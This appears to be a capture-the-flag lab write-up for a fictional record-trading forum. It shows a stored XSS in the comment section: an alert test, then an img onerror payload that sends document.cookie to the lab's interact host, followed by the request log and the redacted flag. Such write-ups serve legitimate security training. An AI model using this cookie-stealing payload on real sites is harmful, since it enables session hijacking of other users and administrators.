---

Name: Crate & Sleeve
Difficulty: Easy
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/07/inscription
Description: Crate & Sleeve has run since 2014 on volunteer hosting and member dues, no auction bots, no eBay scraping, no premium tier. About four hundred records in rotation, a handful of moderators who scan the latest comments on their lunch break, and a codebase a college friend wrote one summer and never came back to. The comment thread is where regulars haggle over pressing variants and condition grades, it's also the part of the site the moderators trust their members on the most. 

---

We confirm the comment section is vulnerable to XSS:

```html
<script>alert("Hacked")</script>
```

Using the interact server provided I created a payload which will steal the admin cookies once they visit the page
```html
<img src=x onerror=this.src='http://65a4184f-5330-inscription-7137e.interact.webverselabs-pro.com/?c='+document.cookie>
```

I got a request 
```
host: 65a4184f-5330-inscription-7137e.interact.webverselabs-pro.com
user-agent: python-requests/2.32.3
accept-encoding: gzip, deflate
accept: */*
connection: keep-aliv
```

The cookie was the flag:
```
c=WEBVERSE{REDACTED}
```
